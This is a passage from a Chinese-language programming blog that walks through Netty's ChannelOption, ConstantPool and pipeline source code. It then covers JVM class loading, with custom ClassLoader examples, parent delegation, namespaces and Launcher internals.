e.getKey(); channel.attr(key).set(e.getValue()); } } ...} ChannelOption类图 io.netty.channelpublic class ChannelOptionextends AbstractConstant&lt;ChannelOption&gt; A ChannelOption allows to configure a ChannelConfig in a type-safe way. Which ChannelOption is supported depends on the actual implementation of ChannelConfig and may depend on the nature of the transport it belongs to. Type parameters: - the type of the value which is valid for the ChannelOption ChannelOption &lt;T&gt; 主要维护 TCP/IP 的一些底层的设定，T 表示值的类型 ChannelOption 继承了 AbstractConstant， AbstractConstant 有是 Constant 的一个基本的实现 io.netty.util.Constant io.netty.utilpublic interface Constant&lt;T extends Constant&gt;extends Comparable A singleton which is safe to compare via the == operator. Created and managed by ConstantPool. Type parameters: - the type of objects that this object may be compared to 我们可以知道这个常量是由 ConstantPool 来维持的，我看看他是怎么起作用的 io.netty.util.ConstantPool public abstract class ConstantPool&lt;T extends Constant&lt;T&gt;&gt; { private final ConcurrentMap&lt;String, T&gt; constants = PlatformDependent.newConcurrentHashMap(); private final AtomicInteger nextId = new AtomicInteger(1); /** * Shortcut of {@link #valueOf(String) valueOf(firstNameComponent.getName() + &quot;#&quot; + secondNameComponent)}. */ public T valueOf(Class&lt;?&gt; firstNameComponent, String secondNameComponent) { if (firstNameComponent == null) { throw new NullPointerException(&quot;firstNameComponent&quot;); } if (secondNameComponent == null) { throw new NullPointerException(&quot;secondNameComponent&quot;); } return valueOf(firstNameComponent.getName() + '#' + secondNameComponent); } /** * Returns the {@link Constant} which is assigned to the specified {@code name}. * If there's no such {@link Constant}, a new one will be created and returned. * Once created, the subsequent calls with the same {@code name} will always return the previously created one * (i.e. singleton.) * * @param name the name of the {@link Constant} */ public T valueOf(String name) { checkNotNullAndNotEmpty(name); return getOrCreate(name); } /** * Get existing constant by name or creates new one if not exists. Threadsafe * * @param name the name of the {@link Constant} */ private T getOrCreate(String name) { T constant = constants.get(name); if (constant == null) { final T tempConstant = newConstant(nextId(), name); constant = constants.putIfAbsent(name, tempConstant); if (constant == null) { return tempConstant; } } return constant; } /** * Returns {@code true} if a {@link AttributeKey} exists for the given {@code name}. */ public boolean exists(String name) { checkNotNullAndNotEmpty(name); return constants.containsKey(name); } /** * Creates a new {@link Constant} for the given {@code name} or fail with an * {@link IllegalArgumentException} if a {@link Constant} for the given {@code name} exists. */ public T newInstance(String name) { checkNotNullAndNotEmpty(name); return createOrThrow(name); } /** * Creates constant by name or throws exception. Threadsafe * * @param name the name of the {@link Constant} */ private T createOrThrow(String name) { T constant = constants.get(name); if (constant == null) { final T tempConstant = newConstant(nextId(), name); constant = constants.putIfAbsent(name, tempConstant); if (constant == null) { return tempConstant; } } throw new IllegalArgumentException(String.format(&quot;'%s' is already in use&quot;, name)); } private static String checkNotNullAndNotEmpty(String name) { ObjectUtil.checkNotNull(name, &quot;name&quot;); if (name.isEmpty()) { throw new IllegalArgumentException(&quot;empty name&quot;); } return name; } protected abstract T newConstant(int id, String name); @Deprecated public final int nextId() { return nextId.getAndIncrement(); }} 我们先看这个创建方法 /** * Get existing constant by name or creates new one if not exists. Threadsafe * * @param name the name of the {@link Constant} */private T getOrCreate(String name) { T constant = constants.get(name); if (constant == null) { final T tempConstant = newConstant(nextId(), name); constant = constants.putIfAbsent(name, tempConstant); if (constant == null) { return tempConstant; } } return constant;} 这里使用了双重检验机制，这个常量池保存的值是一个 T extends Constant&lt;T&gt; 包装过后的 io.netty.util.ConstantPool#newConstant 新建一个常量是由子类完成的，我们回到 ChannelOption 类中，**ChannelOption 是不保存值的，只是维护键的包装** AttributeKeyio.netty.util.AttributeKey io.netty.utilpublic final class AttributeKeyextends AbstractConstant&lt;AttributeKey&gt; Key which can be used to access Attribute out of the AttributeMap. Be aware that it is not be possible to have multiple keys with the same name. Type parameters: - the type of the Attribute which can be accessed via this AttributeKey. 与 ChannelOption 很相似，AttributeMap ，AttributeKey ，Attribute 相当一个 Map，key 和 value /** * Holds {@link Attribute}s which can be accessed via {@link AttributeKey}. * * Implementations must be Thread-safe. */public interface AttributeMap { /** * Get the {@link Attribute} for the given {@link AttributeKey}. This method will never return null, but may return * an {@link Attribute} which does not have a value set yet. */ &lt;T&gt; Attribute&lt;T&gt; attr(AttributeKey&lt;T&gt; key); /** * Returns {@code} true if and only if the given {@link Attribute} exists in this {@link AttributeMap}. */ &lt;T&gt; boolean hasAttr(AttributeKey&lt;T&gt; key);} 主要维护的是业务数据，可以在程序运行中动态的往里面添加数据和获取数据 ChannelInitializerio.netty.bootstrap.ServerBootstrap#init 回到 init 方法上 @Overridevoid init(Channel channel) throws Exception { ChannelPipeline p = channel.pipeline(); ... p.addLast(new ChannelInitializer&lt;Channel&gt;() { @Override public void initChannel(final Channel ch) throws Exception { final ChannelPipeline pipeline = ch.pipeline(); ChannelHandler handler = config.handler(); if (handler != null) { pipeline.addLast(handler); } ch.eventLoop().execute(new Runnable() { @Override public void run() { pipeline.addLast(new ServerBootstrapAcceptor( ch, currentChildGroup, currentChildHandler, currentChildOptions, currentChildAttrs)); } }); } });} 获取管道添加了一个 ChannelInitializer 实例，先看看这个类 io.netty.channel.ChannelInitializer io.netty.channel@Sharablepublic abstract class ChannelInitializerextends ChannelInboundHandlerAdapter A special ChannelInboundHandler which offers an easy way to initialize a Channel once it was registered to its EventLoop. Implementations are most often used in the context of Bootstrap.handler(ChannelHandler) , ServerBootstrap.handler(ChannelHandler) and ServerBootstrap.childHandler(ChannelHandler) to setup the ChannelPipeline of a Channel. public class MyChannelInitializer extends ChannelInitializer { public void initChannel(Channel channel) { channel.pipeline().addLast(&quot;myHandler&quot;, new MyHandler()); }}ServerBootstrap bootstrap = ...;...bootstrap.childHandler(new MyChannelInitializer());... Be aware that this class is marked as ChannelHandler.Sharable and so the implementation must be safe to be re-used. Type parameters: - A sub-type of Channel addLast() 方法io.netty.channel.DefaultChannelPipeline#addLast @Overridepublic final ChannelPipeline addLast(EventExecutorGroup group, String name, ChannelHandler handler) { final AbstractChannelHandlerContext newCtx; synchronized (this) { checkMultiplicity(handler); newCtx = newContext(group, filterName(name, handler), handler); addLast0(newCtx); // If the registered is false it means that the channel was not registered on an eventloop yet. // In this case we add the context to the pipeline and add a task that will call // ChannelHandler.handlerAdded(...) once the channel is registered. if (!registered) { newCtx.setAddPending(); callHandlerCallbackLater(newCtx, true); return this; } EventExecutor executor = newCtx.executor(); if (!executor.inEventLoop()) { newCtx.setAddPending(); executor.execute(new Runnable() { @Override public void run() { callHandlerAdded0(newCtx); } }); return this; } } callHandlerAdded0(newCtx); return this;} AbstractChannelHandlerContext 定义了一个上下文，找到实现的一个接口 ChannelHandlerContext io.netty.channel.ChannelHandlerContext 文档：https://netty.io/5.0/api/io/netty/channel/ChannelHandlerContext.html 接下来我分析一下 ChannelHandlerContext ，PipeLine，Handler 这三者的关系。 加油！！！","link":"/2019/01/15/Netty_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"},{"title":"深入理解Java虚拟机（二）","text":"ClassLoader文档：https://docs.oracle.com/javase/7/docs/api/java/lang/ClassLoader.html public abstract class ClassLoader extends Object A class loader is an object that is responsible for loading classes. The class ClassLoader is an abstract class. Given the binary name of a class, a class loader should attempt to locate or generate data that constitutes a definition for the class. A typical strategy is to transform the name into a file name and then read a “class file” of that name from a file system. Every Class object contains a reference to the ClassLoader that defined it. Class objects for array classes are not created by class loaders, but are created automatically as required by the Java runtime. The class loader for an array class, as returned by Class.getClassLoader() is the same as the class loader for its element type; if the element type is a primitive type, then the array class has no class loader. Applications implement subclasses of ClassLoader in order to extend the manner in which the Java virtual machine dynamically loads classes. Class loaders may typically be used by security managers to indicate security domains. The ClassLoader class uses a delegation model to search for classes and resources. Each instance of ClassLoader has an associated parent class loader. When requested to find a class or resource, a ClassLoader instance will delegate the search for the class or resource to its parent class loader before attempting to find the class or resource itself. The virtual machine’s built-in class loader, called the “bootstrap class loader”, does not itself have a parent but may serve as the parent of a ClassLoader instance. Class loaders that support concurrent loading of classes are known as parallel capable class loaders and are required to register themselves at their class initialization time by invoking the ClassLoader.registerAsParallelCapable method. Note that the ClassLoader class is registered as parallel capable by default. However, its subclasses still need to register themselves if they are parallel capable. In environments in which the delegation model is not strictly hierarchical, class loaders need to be parallel capable, otherwise class loading can lead to deadlocks because the loader lock is held for the duration of the class loading process (see loadClass methods). Normally, the Java virtual machine loads classes from the local file system in a platform-dependent manner. For example, on UNIX systems, the virtual machine loads classes from the directory defined by the CLASSPATH environment variable. However, some classes may not originate from a file; they may originate from other sources, such as the network, or they could be constructed by an application. The method defineClass converts an array of bytes into an instance of class Class. Instances of this newly defined class can be created using Class.newInstance. The methods and constructors of objects created by a class loader may reference other classes. To determine the class(es) referred to, the Java virtual machine invokes the loadClass method of the class loader that originally created the class. For example, an application could create a network class loader to download class files from a server. Sample code might look like: ClassLoader loader = new NetworkClassLoader(host, port);Object main = loader.loadClass(&quot;Main&quot;, true).newInstance(); . . . The network class loader subclass must define the methods findClass and loadClassData to load a class from the network. Once it has downloaded the bytes that make up the class, it should use the method defineClass to create a class instance. A sample implementation is: class NetworkClassLoader extends ClassLoader { String host; int port; public Class findClass(String name) { byte[] b = loadClassData(name); return defineClass(name, b, 0, b.length); } private byte[] loadClassData(String name) { // load the class data from the connection . . . }} Binary names Any class name provided as a String parameter to methods in ClassLoader must be a binary name as defined by The Java™ Language Specification. Examples of valid class names include: &quot;java.lang.String&quot; // 一个类&quot;javax.swing.JSpinner$DefaultEditor&quot; // 一个内部类&quot;java.security.KeyStore$Builder$FileBuilder$1&quot; // 内部类的匿名类&quot;java.net.URLClassLoader$3$1&quot; // 匿名类的匿名类 我们知道类的加载是双亲委派机制，我们先来看一个例子 public class MyTest15 { public static void main(String[] args) { ClassLoader loader = MyTest15.class.getClassLoader(); System.out.println(loader); ClassLoader loader1 = loader.getParent(); System.out.println(loader1); ClassLoader loader2 = loader1.getParent(); System.out.println(loader2); }} 输出 sun.misc.Launcher$AppClassLoader@dad5dcsun.misc.Launcher$ExtClassLoader@16d3586null 当为根加载器时，返回null 看了文档，写一个自定义 ClassLoader /** * @Author: cuzz * @Date: 2019/1/28 12:39 * @Description: */public class MyClassLoader extends ClassLoader{ private String classLoaderName; private final String fileExtension = &quot;.class&quot;; public MyClassLoader(String classLoaderName) { super(); // 将系统类加载当做该类加载器的父加载器 this.classLoaderName = classLoaderName; } public MyClassLoader(ClassLoader parent, String classLoaderName) { super(parent); // 显示指定该类加载的父加载器 this.classLoaderName = classLoaderName; } @Override protected Class&lt;?&gt; findClass(String className) throws ClassNotFoundException { byte[] data = loadClassData(className); return defineClass(className, data,0, data.length); } private byte[] loadClassData(String name) { InputStream is = null; byte[] data = null; ByteArrayOutputStream baos = null; try { this.classLoaderName = this.classLoaderName.replace(&quot;.&quot;, &quot;/&quot;); is = new FileInputStream(new File(name, this.fileExtension)); baos = new ByteArrayOutputStream(); int ch; while (-1 != (ch = is.read())) { baos.write(ch); } data = baos.toByteArray(); } catch (Exception e) { e.printStackTrace(); } finally { try { is.close(); baos.close(); } catch (Exception e) { e.printStackTrace(); } } return data; } public static void main(String[] args) throws Exception{ MyClassLoader myClassLoader = new MyClassLoader(&quot;myLoader&quot;); Class&lt;?&gt; clazz = myClassLoader.loadClass(&quot;com.cuzz.jvm.classloader.MyTest01&quot;); Object o = clazz.newInstance(); // 获取实例对象 System.out.println(&quot;类加载器：&quot; + clazz.getClassLoader()); System.out.println(o); }} 输出 类加载器：sun.misc.Launcher$AppClassLoader@dad5dccom.cuzz.jvm.classloader.MyTest01@16d3586 我们编写的类加载器不起作用，因为双亲委派机制，当我们尝试使用自己编写的类加载器去加载时，它会委派自己的双亲去加载，刚好系统类加载器（应用类加载器）就能加载，所以不会使用我们自己编写的类加载器，而使用系统类加载器 如果我们把路径换一下，把项目路径下 classes 中的 MyTest01.class 文件移动在别的地方，让系统类加载器找不到，然后它就会调用我们自己编写的类加载器加载 public class MyClassLoader extends ClassLoader{ private String classLoaderName; private final String fileExtension = &quot;.class&quot;; private String path; public MyClassLoader(String classLoaderName) { super(); // 将系统类加载当做该类加载器的父加载器 this.classLoaderName = classLoaderName; } public MyClassLoader(ClassLoader parent, String classLoaderName) { super(parent); // 显示指定该类加载的父加载器 this.classLoaderName = classLoaderName; } public void setPath(String path) { this.path = path; } @Override protected Class&lt;?&gt; findClass(String className) throws ClassNotFoundException { byte[] data = loadClassData(className); return defineClass(className, data,0, data.length); } private byte[] loadClassData(String name) { InputStream is = null; byte[] data = null; ByteArrayOutputStream baos = null; name = name.replace(&quot;.&quot;, &quot;\\\\&quot;); try { is = new FileInputStream(new File(this.path + name + this.fileExtension)); baos = new ByteArrayOutputStream(); int ch; while (-1 != (ch = is.read())) { baos.write(ch); } data = baos.toByteArray(); } catch (Exception e) { e.printStackTrace(); } finally { try { is.close(); baos.close(); } catch (Exception e) { e.printStackTrace(); } } return data; } public static void main(String[] args) throws Exception{ MyClassLoader myClassLoader = new MyClassLoader(&quot;myLoader&quot;); // Class&lt;?&gt; clazz = myClassLoader.loadClass(&quot;com.cuzz.jvm.classloader.MyTest01&quot;); String path = &quot;C:/Users/my/Desktop/&quot;; myClassLoader.setPath(path); Class&lt;?&gt; clazz = myClassLoader.loadClass(&quot;com.cuzz.jvm.classloader.MyTest01&quot;); Object o = clazz.newInstance(); // 获取实例对象 System.out.println(&quot;类加载器：&quot; + clazz.getClassLoader()); System.out.println(&quot;父类加载器：&quot; + myClassLoader.getParent()); System.out.println(o); }} 输出 类加载器：com.cuzz.jvm.classloader.MyClassLoader@16d3586父类加载器：sun.misc.Launcher$AppClassLoader@dad5dccom.cuzz.jvm.classloader.MyTest01@a14482 defineClasjava.lang.ClassLoader#defineClass(java.lang.String, byte[], int, int) protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len) throws ClassFormatError { return defineClass(name, b, off, len, null);} 通过一个字节数组返回一个 Class 的实例 loadClassjava.lang.ClassLoader#loadClass(java.lang.String, boolean) 文档： java.lang.ClassLoaderprotected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundExceptionLoads the class with the specified binary name. The default implementation of this method searches for classes in the following order: Invoke findLoadedClass(String) to check if the class has already been loaded. Invoke the loadClass method on the parent class loader. If the parent is null the class loader built-in to the virtual machine is used, instead. Invoke the findClass(String) method to find the class. If the class was found using the above steps, and the resolve flag is true, this method will then invoke the resolveClass(Class) method on the resulting Class object.Subclasses of ClassLoader are encouraged to override findClass(String), rather than this method.Unless overridden, this method synchronizes on the result of getClassLoadingLock method during the entire class loading process.Parameters: name - The binary name of the class resolve - If true then resolve the class protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException{ synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class&lt;?&gt; c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // 我们只需要重写这个方法就可以 // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; }} 命名空间每一个类加载器斗鱼自己的命名空间，命名空间由该加载器及所有父类加载器所加载的类组成，在同一个命名空间中，不会出现类的完整名字（包括类的包名）相同的两个类，在不同的命名空间中，有可能会出现类的完整名字（包括类的包名）相同的两个类 public static void main(String[] args) throws Exception{ MyClassLoader myClassLoader = new MyClassLoader(&quot;myLoader&quot;); MyClassLoader myClassLoader1 = new MyClassLoader(&quot;myLoader1&quot;); String path = &quot;C:/Users/my/Desktop/&quot;; myClassLoader.setPath(path); myClassLoader1.setPath(path); Class&lt;?&gt; clazz = myClassLoader.loadClass(&quot;com.cuzz.jvm.classloader.MyTest01&quot;); Class&lt;?&gt; clazz1 = myClassLoader1.loadClass(&quot;com.cuzz.jvm.classloader.MyTest01&quot;); System.out.println(&quot;clazz: &quot; + clazz.hashCode()); System.out.println(&quot;clazz1: &quot; + clazz1.hashCode());} 输出 clazz: 24324022clazz1: 21685669 说明类被加载了两次，这就是由不同的命名空间导致的 如果我们给 myClassLoader1 添加一个父加载器 public static void main(String[] args) throws Exception{ MyClassLoader myClassLoader = new MyClassLoader(&quot;myLoader&quot;); // 把 myClassLoader 当做父加载器 MyClassLoader myClassLoader1 = new MyClassLoader(myClassLoader,&quot;myLoader1&quot;); String path = &quot;C:/Users/my/Desktop/&quot;; myClassLoader.setPath(path); myClassLoader1.setPath(path); Class&lt;?&gt; clazz = myClassLoader.loadClass(&quot;com.cuzz.jvm.classloader.MyTest01&quot;); Class&lt;?&gt; clazz1 = myClassLoader1.loadClass(&quot;com.cuzz.jvm.classloader.MyTest01&quot;); System.out.println(&quot;clazz: &quot; + clazz.hashCode()); System.out.println(&quot;clazz1: &quot; + clazz1.hashCode());} 输出 clazz: 10568834clazz1: 10568834 由于父加载器已经加载过了，所以就不会加载了 类的卸载由 Java 虚拟机自带的类加载器所加载的类，在虚拟机的生命周期中，始终不会被卸载。前面已经介绍过，Java 虚拟机自带的类加载器包括根类加载器、扩展类加载器和系统类加载器。Java 虚拟机本身会始终引用这些类加载器，而这些类加载器则会始终引用它们所加载类的 Class 对象，因此这些 Class 对象始终是可触及的 而由用户自定义的类加载器所加载的类是可以被卸载的 类加载器命名空间深度解析通过一个例子来分析 MyCat public class MyCat { public MyCat() { System.out.println(&quot;MyCat is loaded by: &quot; + this.getClass().getClassLoader()); }} MySample public class MySample { public MySample () { System.out.println(&quot;MySample is loaded by:&quot; + this.getClass().getClassLoader()); new MyCat (); }} MyClassLoader public class MyClassLoader extends ClassLoader{ private String classLoaderName; private final String fileExtension = &quot;.class&quot;; private String path; public MyClassLoader(String classLoaderName) { super(); // 将系统类加载当做该类加载器的父加载器 this.classLoaderName = classLoaderName; } public MyClassLoader(ClassLoader parent, String classLoaderName) { super(parent); // 显示指定该类加载的父加载器 this.classLoaderName = classLoaderName; } public void setPath(String path) { this.path = path; } @Override protected Class&lt;?&gt; findClass(String className) throws ClassNotFoundException { byte[] data = loadClassData(className); return defineClass(className, data,0, data.length); } private byte[] loadClassData(String name) { InputStream is = null; byte[] data = null; ByteArrayOutputStream baos = null; name = name.replace(&quot;.&quot;, &quot;\\\\&quot;); try { is = new FileInputStream(new File(this.path + name + this.fileExtension)); baos = new ByteArrayOutputStream(); int ch; while (-1 != (ch = is.read())) { baos.write(ch); } data = baos.toByteArray(); } catch (Exception e) { e.printStackTrace(); } finally { try { is.close(); baos.close(); } catch (Exception e) { e.printStackTrace(); } } return data; } public static void main(String[] args) throws Exception{ MyClassLoader myClassLoader = new MyClassLoader(&quot;myLoader&quot;); String path = &quot;C:/Users/my/Desktop/&quot;; myClassLoader.setPath(path); Class&lt;?&gt; clazz = myClassLoader.loadClass(&quot;com.cuzz.jvm.classloader.MySample&quot;); Object object = clazz.newInstance(); }} 输出 MySample is loaded by: sun.misc.Launcher$AppClassLoader@dad5dcMyCat is loaded by: sun.misc.Launcher$AppClassLoader@dad5dc 我们知道我们自己写的 ClassLoader 与委托父类加载器去加载，所以是系统加载器加载的 现在我们把项目下 classes 路径中的 MySample.class 和 MyCat.class 删除，并复制一份到桌面 则输出 MySample is loaded by: com.cuzz.jvm.classloader.MyClassLoader@16d3586MyCat is loaded by: com.cuzz.jvm.classloader.MyClassLoader@16d3586 由于委托父类加载器加载不到就用自己加载器加载 如果我们只把当前类路径下 MySample.class 这给文件删掉，保留 MyCat.class 文件，则输出 MySample is loaded by: com.cuzz.jvm.classloader.MyClassLoader@16d3586MyCat is loaded by: sun.misc.Launcher$AppClassLoader@dad5dc 我们知道 MySample 是我们自定义类加载加载出来的，MyCat 是有系统类加载加载的 public class MySample { public MySample () { System.out.println(&quot;MySample is loaded by: &quot; + this.getClass().getClassLoader()); new MyCat (); System.out.println(MyCat.class); }} 输出 MySample is loaded by: com.cuzz.jvm.classloader.MyClassLoader@16d3586MyCat is loaded by: sun.misc.Launcher$AppClassLoader@dad5dcclass com.cuzz.jvm.classloader.MyCat 说明自定义类加载加载的类，可以访问系统类加载加载的类 如果我们在系统类加载的类中访问自定义类加载器加载的类 public class MyCat { public MyCat() { System.out.println(&quot;MyCat is loaded by: &quot; + this.getClass().getClassLoader()); System.out.println(MySample.class); }} 输出 MySample is loaded by: com.cuzz.jvm.classloader.MyClassLoader@16d3586MyCat is loaded by: sun.misc.Launcher$AppClassLoader@dad5dcException in thread &quot;main&quot; java.lang.NoClassDefFoundError: com/cuzz/jvm/classloader/MySample at com.cuzz.jvm.classloader.MyCat.&lt;init&gt;(MyCat.java:6) at com.cuzz.jvm.classloader.MySample.&lt;init&gt;(MySample.java:6) at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:422) at java.lang.Class.newInstance(Class.java:442) at com.cuzz.jvm.classloader.MyClassLoader.main(MyClassLoader.java:68)Caused by: java.lang.ClassNotFoundException: com.cuzz.jvm.classloader.MySample at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ... 8 more 报错，说明系统加载器加载的类不能访问自定义加载器加载的类 说明当我现在加载 MySample 这个类时，使用的是我们自己定义的类加载器，然后初始实例化这个类时，需要初始化 MyCat 这个类，所以会先委托父加载器（系统加载器）去加载 但是如果我们把当前路径下的 MyCat.class 文件删掉，保留 MySample.class 文件，则报错 Exception in thread &quot;main&quot; MySample is loaded by: sun.misc.Launcher$AppClassLoader@dad5dcjava.lang.NoClassDefFoundError: com/cuzz/jvm/classloader/MyCat at com.cuzz.jvm.classloader.MySample.&lt;init&gt;(MySample.java:6) at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:422) at java.lang.Class.newInstance(Class.java:442) at com.cuzz.jvm.classloader.MyClassLoader.main(MyClassLoader.java:68)Caused by: java.lang.ClassNotFoundException: com.cuzz.jvm.classloader.MyCat at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ... 7 more 我要加载 MySample 先委托系统类加载加载，发现能加载到，然后再想加载 MyCat 这个类，此时它会调用系统加载器的父类去加载，发现加载不到，自己也不能加载，就报错了。 通过上面的例子，我们可以得出以下结论： 子类加载器所加载的类能够访问到父加载器所加载的类 父类加载器所加载的类无法访问到子加载器所加载的类 类加载器的双亲委托模型的好处可以确保 Java 核心库的类型安全：所有的 Java 应用都至少会引用 java.lang.Object 类，也就是说在运行期，java.lang.Object 这个类会被加载到 Java 虚拟机中；如果这个加载过程是由 Java 应用自己的类加载所完成的，那么很可能就会在 JVM 中存在多个版本的 java.lang.Object 了，而这些类之间还是不兼容的，相互不可见（正是命名空间发挥着作用）。可以确保 Java 核心类库所提供的类不会被自定义的类所取代。不同的类加载器可以为相同的名称（binary name）的类创建额外的命名空间。相同的名称的类可以并存在 Java 虚拟机中，只要用不同的类加载器来加载它们即可（可是是不同的类加载器，也可以是相同类加载器的不同实例）。不同的类加载器所加载的类之间是不兼容的，就相同于在 Java 虚拟机内部创建了一个又一个相互隔离的 Java 类空间，这类技术在很多框架中都得到了实际的应用。 内建于 JVM 中的启动类加载器会加载 java.lang.ClassLoader 以及其他的 Java 平台类，当 JVM 启动时，一块特殊的机器码会运行，它会加载扩展类加载器和系统类加载器，这块特殊的机器码叫做启动类加载器（Bootstrap），启动类加载器并不是 Java 类，而其它加载器则都是 Java 类，启动类加载器是特定于平台的机器指令，它负责开启整个加载过程。启动类加载器还会负责加载 JRE 正常运行所需要的基本组件，这包括 java.util 与 java.lang 包中的类等等。 Launcher 类源码分析前面我们分析类 ClassLoader，里面有一个静态方法 getSystemClassLoader，发现 ClassLoader 是 Launcher 中一个成员变量 @CallerSensitive public static ClassLoader getSystemClassLoader() { initSystemClassLoader(); // 初始化 if (scl == null) { return null; } SecurityManager sm = System.getSecurityManager(); if (sm != null) { checkClassLoaderPermission(scl, Reflection.getCallerClass()); } return scl; } private static synchronized void initSystemClassLoader() { if (!sclSet) { if (scl != null) throw new IllegalStateException(&quot;recursive invocation&quot;); // 获取一个 Launcher 类 sun.misc.Launcher l = sun.misc.Launcher.getLauncher(); if (l != null) { Throwable oops = null; // scl 表示 SystemClassLoader scl = l.getClassLoader(); try { scl = AccessController.doPrivileged( new SystemClassLoaderAction(scl)); } catch (PrivilegedActionException pae) { oops = pae.getCause(); if (oops instanceof InvocationTargetException) { oops = oops.getCause(); } } ... } } }} 我们在idea里边看到的 sun.misc.Launcher.getLauncher() 的实现是反编译工具给出的，oracle并没有给出源码，可以到网上查找相关代码 private static Launcher launcher = new Launcher();private static String bootClassPath = System.getProperty(&quot;sun.boot.class.path&quot;); public static Launcher getLauncher() { return launcher; } private ClassLoader loader; public Launcher() { // Create the extension class loader ClassLoader extcl; try { extcl = ExtClassLoader.getExtClassLoader(); } catch (IOException e) { throw new InternalError( &quot;Could not create extension class loader&quot;); } // Now create the class loader to use to launch the application try { loader = AppClassLoader.getAppClassLoader(extcl); } catch (IOException e) { throw new InternalError( &quot;Could not create application class loader&quot;); } // Also set the context class loader for the primordial thread. Thread.currentThread().setContextClassLoader(loader); // Finally, install a security manager if requested String s = System.getProperty(&quot;java.security.manager&quot;); ...... } /* * Returns the class loader used to launch the main application. */ public ClassLoader getClassLoader() { return loader; } 可以看到 Launcher 类初始化时，先初始化了个 ExtClassLoader，然后又初始化了个 AppClassLoader，然后把ExtClassLoader 作为 AppClassLoader的父 loader，ExtClassLoader 没有指定父类，即表明，父类是BootstrapClassLoader。把初始化 的AppClassLoader 作为全局变量保存起来，并设置到当前线程contextClassLoader，每个线程实例可以设置一个 contextClassLoader 。 先回到 initSystemClassLoader 方法中，有这一段代码 try { scl = AccessController.doPrivileged( new SystemClassLoaderAction(scl));} catch (PrivilegedActionException pae) { oops = pae.getCause(); if (oops instanceof InvocationTargetException) { oops = oops.getCause(); }} 我们把系统加载传入到 doPrivileged 中的 SystemClassLoaderAction 中又返回了系统加载器，我们看看 SystemClassLoaderAction 这个类 class SystemClassLoaderAction implements PrivilegedExceptionAction&lt;ClassLoader&gt; { private ClassLoader parent; SystemClassLoaderAction(ClassLoader parent) { this.parent = parent; } public ClassLoader run() throws Exception { String cls = System.getProperty(&quot;java.system.class.loader&quot;); if (cls == null) { return parent; } Constructor&lt;?&gt; ctor = Class.forName(cls, true, parent) .getDeclaredConstructor(new Class&lt;?&gt;[] { ClassLoader.class }); ClassLoader sys = (ClassLoader) ctor.newInstance( new Object[] { parent }); Thread.currentThread().setContextClassLoader(sys); return sys; }} 这块逻辑的作用是看看是否设置了系统属性 java.system.class.loader，即自定义的系统类加载器，如果设置了那么实例化自定义的系统类加载器返回，替代之前获取的系统类加载器，如果没有设置直接返回默认的系统类加载器。 Class.forName()java.lang.Class#forName(java.lang.String, boolean, java.lang.ClassLoader) 文档： java.lang.Classpublic static Class&lt;?&gt; forName(@NonNls String name, boolean initialize, ClassLoader loader) throws ClassNotFoundExceptionReturns the Class object associated with the class or interface with the given string name, using the given class loader. Given the fully qualified name for a class or interface (in the same format returned by getName) this method attempts to locate, load, and link the class or interface. The specified class loader is used to load the class or interface. If the parameter loader is null, the class is loaded through the bootstrap class loader. The class is initialized only if the initialize parameter is true and if it has not been initialized earlier.If name denotes a primitive type or void, an attempt will be made to locate a user-defined class in the unnamed package whose name is name. Therefore, this method cannot be used to obtain any of the Class objects representing primitive types or void.If name denotes an array class, the component type of the array class is loaded but not initialized.For example, in an instance method the expression:Class.forName(“Foo”)is equivalent to:Class.forName(“Foo”, true, this.getClass().getClassLoader())Note that this method throws errors related to loading, linking or initializing as specified in Sections 12.2, 12.3 and 12.4 of The Java Language Specification. Note that this method does not check whether the requested class is accessible to its caller.If the loader is null, and a security manager is present, and the caller’s class loader is not null, then this method calls the security manager’s checkPermission method with a RuntimePermission(“getClassLoader”) permission to ensure it’s ok to access the bootstrap class loader.Parameters: name - fully qualified name of the desired class initialize - if true the class will be initialized. See Section 12.4 of The Java Language Specification. loader - class loader from which the class must be loaded 代码： public static Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader) throws ClassNotFoundException{ Class&lt;?&gt; caller = null; SecurityManager sm = System.getSecurityManager(); if (sm != null) { // Reflective call to get caller class is only needed if a security manager // is present. Avoid the overhead of making this call otherwise. // 获取调用 forName 方法的的那个类 caller = Reflection.getCallerClass(); if (sun.misc.VM.isSystemDomainLoader(loader)) { ClassLoader ccl = ClassLoader.getClassLoader(caller); if (!sun.misc.VM.isSystemDomainLoader(ccl)) { sm.checkPermission( SecurityConstants.GET_CLASSLOADER_PERMISSION); } } } return forName0(name, initialize, loader, caller);} 线程上下文类加载器分析与实现接下来我们来分析一下线程上下文类加载的作用 前言看一个程序来一下感性的认识： public class MyTest24 { public static void main(String[] args) 